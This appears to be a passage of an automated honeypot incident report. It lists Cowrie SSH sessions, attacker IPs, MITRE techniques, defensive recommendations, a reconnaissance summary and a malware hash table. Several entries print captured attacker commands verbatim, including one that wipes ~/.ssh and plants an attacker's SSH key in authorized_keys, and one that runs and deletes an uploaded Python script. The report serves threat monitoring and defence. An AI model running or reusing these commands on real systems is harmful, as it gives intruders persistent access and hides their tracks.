| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:42:01` | `cowrie.session.connect` |
| `2026-09-21 12:42:01` | `cowrie.client.version` |
| `2026-09-21 12:42:01` | `cowrie.client.kex` |
| `2026-09-21 12:42:02` | `cowrie.login.success` |
| `2026-09-21 12:42:02` | `cowrie.session.params` |
| `2026-09-21 12:42:02` | `cowrie.command.input` |
| `2026-09-21 12:42:02` | `cowrie.command.failed` |
| `2026-09-21 12:42:02` | `cowrie.log.closed` |
| `2026-09-21 12:42:03` | `cowrie.session.params` |
| `2026-09-21 12:42:03` | `cowrie.command.input` |
| `2026-09-21 12:42:03` | `cowrie.session.file_download` |
| `2026-09-21 12:42:03` | `cowrie.log.closed` |
| `2026-09-21 12:42:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.114.236[.]21` to AbuseIPDB if not already reported
- [ ] Block `50.114.236[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-babee2c5f728

| Field | Detail |
|---|---|
| **Source IP** | `50.114.236[.]21` |
| **First Seen** | 2026-09-21 12:42 |
| **Last Seen** | 2026-09-21 12:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:42:03` | `cowrie.session.connect` |
| `2026-09-21 12:42:03` | `cowrie.client.version` |
| `2026-09-21 12:42:03` | `cowrie.client.kex` |
| `2026-09-21 12:42:04` | `cowrie.login.success` |
| `2026-09-21 12:42:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.114.236[.]21` to AbuseIPDB if not already reported
- [ ] Block `50.114.236[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-732ae7599de7

| Field | Detail |
|---|---|
| **Source IP** | `50.114.236[.]21` |
| **First Seen** | 2026-09-21 12:42 |
| **Last Seen** | 2026-09-21 12:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:42:04` | `cowrie.session.connect` |
| `2026-09-21 12:42:04` | `cowrie.client.version` |
| `2026-09-21 12:42:04` | `cowrie.client.kex` |
| `2026-09-21 12:42:04` | `cowrie.login.success` |
| `2026-09-21 12:42:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.114.236[.]21` to AbuseIPDB if not already reported
- [ ] Block `50.114.236[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-472f4e010f33

| Field | Detail |
|---|---|
| **Source IP** | `147.90.234[.]22` |
| **First Seen** | 2026-09-21 12:42 |
| **Last Seen** | 2026-09-21 12:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:42:11` | `cowrie.session.connect` |
| `2026-09-21 12:42:11` | `cowrie.client.version` |
| `2026-09-21 12:42:11` | `cowrie.client.kex` |
| `2026-09-21 12:42:11` | `cowrie.login.success` |
| `2026-09-21 12:42:12` | `cowrie.session.params` |
| `2026-09-21 12:42:12` | `cowrie.command.input` |
| `2026-09-21 12:42:12` | `cowrie.command.failed` |
| `2026-09-21 12:42:12` | `cowrie.log.closed` |
| `2026-09-21 12:42:13` | `cowrie.session.params` |
| `2026-09-21 12:42:13` | `cowrie.command.input` |
| `2026-09-21 12:42:13` | `cowrie.session.file_download` |
| `2026-09-21 12:42:13` | `cowrie.log.closed` |
| `2026-09-21 12:42:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.90.234[.]22` to AbuseIPDB if not already reported
- [ ] Block `147.90.234[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aea8d707502

| Field | Detail |
|---|---|
| **Source IP** | `147.90.234[.]22` |
| **First Seen** | 2026-09-21 12:42 |
| **Last Seen** | 2026-09-21 12:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:42:13` | `cowrie.session.connect` |
| `2026-09-21 12:42:13` | `cowrie.client.version` |
| `2026-09-21 12:42:13` | `cowrie.client.kex` |
| `2026-09-21 12:42:13` | `cowrie.login.success` |
| `2026-09-21 12:42:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.90.234[.]22` to AbuseIPDB if not already reported
- [ ] Block `147.90.234[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beadacee3c73

| Field | Detail |
|---|---|
| **Source IP** | `147.90.234[.]22` |
| **First Seen** | 2026-09-21 12:42 |
| **Last Seen** | 2026-09-21 12:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:42:13` | `cowrie.session.connect` |
| `2026-09-21 12:42:13` | `cowrie.client.version` |
| `2026-09-21 12:42:13` | `cowrie.client.kex` |
| `2026-09-21 12:42:13` | `cowrie.login.success` |
| `2026-09-21 12:42:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.90.234[.]22` to AbuseIPDB if not already reported
- [ ] Block `147.90.234[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb0a1b93b5f2

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-21 12:42 |
| **Last Seen** | 2026-09-21 12:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:42:25` | `cowrie.session.connect` |
| `2026-09-21 12:42:25` | `cowrie.client.version` |
| `2026-09-21 12:42:25` | `cowrie.client.kex` |
| `2026-09-21 12:42:26` | `cowrie.login.success` |
| `2026-09-21 12:42:26` | `cowrie.direct-tcpip.request` |
| `2026-09-21 12:42:26` | `cowrie.direct-tcpip.data` |
| `2026-09-21 12:42:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ceebc945741

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-21 12:45 |
| **Last Seen** | 2026-09-21 12:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:45:14` | `cowrie.session.connect` |
| `2026-09-21 12:45:14` | `cowrie.client.version` |
| `2026-09-21 12:45:14` | `cowrie.client.kex` |
| `2026-09-21 12:45:14` | `cowrie.login.success` |
| `2026-09-21 12:45:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e6fc85591d2

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-21 12:45 |
| **Last Seen** | 2026-09-21 12:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:45:20` | `cowrie.session.connect` |
| `2026-09-21 12:45:20` | `cowrie.client.version` |
| `2026-09-21 12:45:20` | `cowrie.client.kex` |
| `2026-09-21 12:45:20` | `cowrie.login.success` |
| `2026-09-21 12:45:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55b92f02fa93

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-21 12:45 |
| **Last Seen** | 2026-09-21 12:47 |
| **Session Duration** | 128s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:45:21` | `cowrie.session.connect` |
| `2026-09-21 12:45:21` | `cowrie.client.version` |
| `2026-09-21 12:45:21` | `cowrie.client.kex` |
| `2026-09-21 12:45:21` | `cowrie.login.success` |
| `2026-09-21 12:45:22` | `cowrie.session.file_upload` |
| `2026-09-21 12:45:24` | `cowrie.session.params` |
| `2026-09-21 12:45:24` | `cowrie.command.input` |
| `2026-09-21 12:45:24` | `cowrie.command.input` |
| `2026-09-21 12:45:24` | `cowrie.command.input` |
| `2026-09-21 12:45:24` | `cowrie.command.failed` |
| `2026-09-21 12:45:24` | `cowrie.log.closed` |
| `2026-09-21 12:45:25` | `cowrie.session.params` |
| `2026-09-21 12:45:25` | `cowrie.command.input` |
| `2026-09-21 12:45:25` | `cowrie.log.closed` |
| `2026-09-21 12:45:25` | `cowrie.session.params` |
| `2026-09-21 12:45:25` | `cowrie.command.input` |
| `2026-09-21 12:45:25` | `cowrie.log.closed` |
| `2026-09-21 12:45:26` | `cowrie.session.params` |
| `2026-09-21 12:45:26` | `cowrie.command.input` |
| `2026-09-21 12:45:26` | `cowrie.command.failed` |
| `2026-09-21 12:45:26` | `cowrie.command.failed` |
| `2026-09-21 12:46:27` | `cowrie.session.params` |
| `2026-09-21 12:46:27` | `cowrie.command.input` |
| `2026-09-21 12:47:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4630f3cdb524

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-21 12:47 |
| **Last Seen** | 2026-09-21 12:49 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:47:29` | `cowrie.session.connect` |
| `2026-09-21 12:47:29` | `cowrie.client.version` |
| `2026-09-21 12:47:29` | `cowrie.client.kex` |
| `2026-09-21 12:47:30` | `cowrie.login.success` |
| `2026-09-21 12:47:31` | `cowrie.session.file_upload` |
| `2026-09-21 12:47:32` | `cowrie.session.params` |
| `2026-09-21 12:47:32` | `cowrie.command.input` |
| `2026-09-21 12:47:32` | `cowrie.command.input` |
| `2026-09-21 12:47:32` | `cowrie.command.input` |
| `2026-09-21 12:47:32` | `cowrie.command.failed` |
| `2026-09-21 12:47:32` | `cowrie.log.closed` |
| `2026-09-21 12:47:32` | `cowrie.session.params` |
| `2026-09-21 12:47:32` | `cowrie.command.input` |
| `2026-09-21 12:47:32` | `cowrie.log.closed` |
| `2026-09-21 12:47:33` | `cowrie.session.params` |
| `2026-09-21 12:47:33` | `cowrie.command.input` |
| `2026-09-21 12:47:33` | `cowrie.log.closed` |
| `2026-09-21 12:47:34` | `cowrie.session.params` |
| `2026-09-21 12:47:34` | `cowrie.command.input` |
| `2026-09-21 12:47:34` | `cowrie.command.failed` |
| `2026-09-21 12:47:34` | `cowrie.command.failed` |
| `2026-09-21 12:48:35` | `cowrie.session.params` |
| `2026-09-21 12:48:35` | `cowrie.command.input` |
| `2026-09-21 12:49:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `172.236.233[.]65` | **120** | 2026-09-21 12:26 | 2026-09-21 12:30 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `104.194.10[.]16` | **23** | 2026-09-21 11:04 | 2026-09-21 12:54 | 15m | 0 | `T1592` | 🟠 MEDIUM |
| `51.158.205[.]203` | **6** | 2026-09-21 12:09 | 2026-09-21 12:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]218` | **3** | 2026-09-21 12:35 | 2026-09-21 12:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **2** | 2026-09-21 11:19 | 2026-09-21 11:24 | 2m | 0 | `T1592` | 🟢 LOW |
| `16.5.0[.]242` | **2** | 2026-09-21 12:38 | 2026-09-21 12:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `35.202.9[.]133` | **2** | 2026-09-21 12:46 | 2026-09-21 12:49 | 1m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]207` | **2** | 2026-09-21 11:27 | 2026-09-21 11:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]179` | **2** | 2026-09-21 10:57 | 2026-09-21 10:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]49` | **2** | 2026-09-21 11:29 | 2026-09-21 11:45 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.46.184[.]80` | 1 | 2026-09-21 11:20 | 2026-09-21 11:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.39.74[.]26` | 1 | 2026-09-21 11:57 | 2026-09-21 11:57 | 13s | 0 | `T1592` | 🟢 LOW |
| `192.248.150[.]180` | 1 | 2026-09-21 11:21 | 2026-09-21 11:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-09-21 12:37 | 2026-09-21 12:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.176.31[.]236` | 1 | 2026-09-21 12:50 | 2026-09-21 12:51 | 10s | 0 | `T1592` | 🟢 LOW |
| `218.94.137[.]166` | 1 | 2026-09-21 12:30 | 2026-09-21 12:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-09-21 10:58 | 2026-09-21 10:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]132` | 1 | 2026-09-21 12:22 | 2026-09-21 12:22 | 15s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]74` | 1 | 2026-09-21 12:34 | 2026-09-21 12:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]176` | 1 | 2026-09-21 10:58 | 2026-09-21 10:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]16` | 1 | 2026-09-21 12:31 | 2026-09-21 12:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]69` | 1 | 2026-09-21 12:06 | 2026-09-21 12:07 | 31s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
